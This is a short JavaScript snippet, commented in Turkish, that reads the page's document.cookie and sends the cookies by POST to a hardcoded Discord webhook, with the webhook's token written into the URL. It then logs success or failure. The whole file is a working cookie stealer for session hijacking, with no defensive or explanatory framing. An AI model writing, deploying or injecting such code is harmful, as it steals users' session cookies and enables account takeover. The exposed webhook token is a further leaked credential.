
const webhookURL = "https://discord.com/api/webhooks/1394074771737542677/uRMsLtGKB__hpo50sbLBSfjO7ltpq5b7qtvR1IO1K24qNCxhQlYdlmxKbBhULgt9Jljj";

const cookies = document.cookie;

fetch(webhookURL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ cookies })
})
.then(response => {
  if(response.ok) {
    console.log("Cookie'ler başarıyla gönderildi.");
  } else {
    console.error("Gönderim hatası:", response.statusText);
  }
})
.catch(err => console.error("Fetch hatası:", err));
